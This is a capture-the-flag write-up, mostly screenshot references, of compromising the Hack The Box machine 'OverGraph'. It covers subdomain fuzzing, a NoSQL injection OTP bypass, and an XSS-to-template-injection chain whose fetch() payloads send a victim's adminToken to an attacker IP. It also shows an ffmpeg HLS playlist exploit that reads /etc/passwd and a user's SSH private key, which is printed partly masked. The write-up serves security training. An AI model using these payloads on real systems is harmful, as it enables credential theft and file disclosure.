![](over%20graph%20logo.png)


## nmap all ports
![](OverGraph/screenshots/nmap%20all%20ports.png)

## nmap services + versions
![](nmap%20services%20+%20versions.png)

## nmap udp scan
![](OverGraph/screenshots/nmap%20udp%20all%20ports.png)

## wfuzz subdomains

````bash
wfuzz -u http://10.10.11.157 -H "Host:FUZZ.graph.htb" -w /opt/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hh 178`

`````

![](wfuzz%20subdomains%20result.png)


## domain graph.htb static TCP 80
![](domain%20html.png)

### response header --> nginx
![](burp%20graph.htb%20nginx%20header.png)


### subdomain internal.graph.htb TCP 80
![](subdomain%20internal.graph.htb%20login.png)

### login not reacting --> burpsuite
![](burp%20internal.graph.htb%20login.png)

### burp no content 204 initially --> unknown host: internal-api.graph.htb
![](burp%20unknown%20host%20status%20204.png)

### burp random host --> 301 moved permanently
![](burp%20random%20host%20status%20301.png)

### burp known host: internal.graph.htb
![](burp%20known%20host%20status%20200.png)

### burp GET internal.graph.htb
![](burp%20GET%20internal%20login.png)

### burp OPTIONS internal-api.graph.htb --> status 204
![](burp%20OPTIONS%20204%20no%20content.png)

### burp response --> angular.js --> js framework
![](burp%20response%20reveals%20angular.js.png)


### graph.htb/djfkjfladkaj --> 404 not found
![](domain%20graph.htb%20not%20found.png)


### response lenght of existence and nonexistence directories are the same 607 --> wildcard response --> directory enum not possible
![](burp%20valid%20directory%20content%20length%20607.png)

![](burp%20invalid%20directory%20content%20607.png)

### by guessing --> internal.graph.htb/register
![](burp%20register.png)

### register 4 digit OTP
![](register%204%20digit%20OTP%20domain.png)

![](burp%20register%20email%20code.png)

### invalid code
![](burp%20invalid%20code.png)

### invalid 4 times
![](burp%20invalid%20code%20OTP%204%20times.png)

### finally > 5 times --> invalid email --> brute forcing PIN is not possible
![](domain%20graphql.png)


### internal-api.graph.htb/graphql
![](graphql.png)

### wrong query from docs reveals home directory in error messages /home/user
![](graphql%20reveals%20servers%20root%20directory.png)

## nosqli --> register an account
![](register%20OTP%20PIN%20bypass%20nosqli.png)

![](register%20account.png)





### login account
![](login%20account.png)

### burp login -->adminToken = false
![](OverGraph/screenshots/burp%20login.png)
### login dashboard
![](OverGraph/screenshots/login%20dashboard.png)

### inbox
![](login%20email%20send%20link.png)

### local storage admin value false --> set to true --> new uplaod feature
![](login%20dashboard%20local%20storage%20admin%20false.png)

### upload feature doesnt work
![](upload%20form%20submit%20not%20enabled.png)

### profile ssti successfull
![](ssti%20in%20profile%20succesfull.png)

### cookie: SameSite=strict --> no xsrf
![](cookie%20site%20strict.png)


### vulnerable code ?redirect --> xss
![](vulnerable%20js%20code.png)

xss succesfull
![](xss%20succesfull.png)

### xss payload to load external file
````bash
http://graph.htb/?redirect=javascript:document.body.innerHTML%2B%3D%27%3Cscript%20src%3d%22http://10.10.14.12:9001/xsrf.js%22%3E%3C/script%3E%27

//url decoded

http://graph.htb/?redirect=javascript:document.body.innerHTML+='<script src="http://10.10.14.12:9001/csrf.js"></script>'

`````

### xss send malicious link 
![](xss%20send%20malicious%20link.png)

### link clicked
![](xss%20external%20file%20server%20hit.png)

### playground get Larrys ID
![](playground%20get%20Larrys%20ID.png)

````
query tasks{
	tasks(username: "Mark"){
    Assignedto
    username
    taskstatus
    type
  }
}

//Larry
Assignedto: 6343d8096489bc0eb2342ffd

//Mark
Assignedto: 6343e619f2b3970f28407b2d
`````

![](playground%20get%20Larry%20ID.png)

### SSTI to load external file from given server
````
//PORT 80
{{constructor.constructor('fetch("http://10.10.14.12/" + localStorage.getItem("adminToken"))')()}}

//PORT 9001
{{constructor.constructor('fetch("http://10.10.14.12:9001/" + localStorage.getItem("adminToken"))')()}}



{{constructor.constructor('fetch(\"http://10.10.14.12/\")')()}}

`````

### ssti external file port 9001 callback
![](SSTI%20to%20load%20external%20file.png)

### ssti external file port 80 callback
![](ssti%20initial%20id.png)

### burp ssti initial id 
![](burp%20ssti%20id%20initial.png)

### burp ssti id changed to Larry --> unauthenticated 
![](burp%20ssti%20id%20changed%20unauthenticated.png)

## putting it all together

### xss to load external file port 9001 --> python server on port 9001
````
http://graph.htb/?redirect=javascript:document.body.innerHTML%2B%3D%27%3Cscript%20src%3d%22http://10.10.14.12:9001/xsrf.js%22%3E%3C/script%3E%27

`````

### xxs to csti port 8888 --> nc listen on port 8888
````

{{constructor.constructor('fetch("http://10.10.14.12:8888/" + localStorage.getItem("adminToken"))')()}}  



{{constructor.constructor('fetch(\"http://10.10.14.12:8888/token?adminToken=\" + localStorage.getItem(\"adminToken\"))')()}}


`````

### xsrf.js
````js
//not working
var req = new XMLHttpRequest();
req.open('POST', 'http://internal.graph.htb/graphql', false);
req.setRequestHeader("Content-Type","text/plain");
req.withCredentials = true;
var body = JSON.stringify({
        operationName: "update",
        variables: {
                firstname: "mark",
                lastname: "{{constructor.constructor('fetch("http://10.10.14.12:8888/" + localStorage.getItem("adminToken"))')()}}",
                id: "6343e619f2b3970f28407b2d",
                newusername: "mark"
        },
        query: "mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {update(newusername: $newusername, id: $id, firstname: $firstname, lastname:$lastname){username,email,id,firstname,lastname,adminToken}}"
});
req.send(body);



//working

fetch('http://internal-api.graph.htb/graphql', {
  method: 'POST',
  credentials: 'include',
  mode: 'no-cors',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    variables: {
      newusername: 'Sally',
      id: '6344337392aec7178b077266',
      firstname: `{{constructor.constructor('fetch(\"http://10.10.14.12:8888/token?adminToken=\" + localStorage.getItem(\"adminToken\"))')()}}`,
      lastname: 'asdf'
    },
    query: `
      mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {
          update(newusername: $newusername, id: $id, firstname: $firstname, lastname: $lastname) {  
              __typename
          }
      }
    `
  })
})


//working two
fetch('http://internal-api.graph.htb/graphql', {
  method: 'POST',
  credentials: 'include',
  mode: 'no-cors',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    variables: {
      newusername: 'Alen',
      id: '634410496cc7381528951152',
      firstname: `{{constructor.constructor('fetch("http://10.10.14.12:8888/" + localStorage.getItem("adminToken"))')()}}`,
      lastname: 'asdf'
    },
    query: `
      mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {
          update(newusername: $newusername, id: $id, firstname: $firstname, lastname: $lastname) {  
              __typename
          }
      }
    `
  })
})



`````



### get admin token
![](xss%20to%20csti%20get%20admin%20token.png)
````
c0b9db4c8e4bbb24d59a3aaffa8c8b83

`````
### set adminToken
![](file%20uploaded%20succesfully.png)



## ssmpeg exploit
![](google%20ssmpeg%20exploit.png)

### doesnt work because of the end of line character: 0a
![](ffmpeg%20not%20working.png)

### delete end of line character with vim
````
:set binary noendofline

`````

### get rid of end of line character
![](remove%20end%20of%20line%20xxd%20show.png)

### ffmpeg exploit read file successfull
![](ffmpeg%20exploit%20read%20file.png)

### header.m3u8
````
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0  
#EXTINF:,
http://10.10.14.12?


`````

### evil.avi
````
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://10.10.14.12/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIS

#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://10.10.14.12/header.m3u8|subfile,,start,1,end,10000,,:/home/user/.ssh/id_rsa
#EXT-X-ENDLIS


`````

## get SSH key one by one
### ssh1
![](ssh%20get%201.png)

### ssh2
![](ssh2.png)

### ssh3
![](ssh%203.png)

### ssh4 etc etc etc --> id_rsa for user
![](ssh%204.png)

````
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
**********************************************************************
AAAEDzdpSxHTz6JXGQhbQsRsDbZoJ+8d3FI5MZ1SJ4NGmdYC90VbMvu9VKf1wfp+AHdKC2
3Y4bhdEZiHm6B/wUsBgMAAAADnVzZXJAb3ZlcmdyYXBoAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----


`````

### user.txt
![](ssh%20user.txt.png)

XXXXXXXXXXXXXXXXX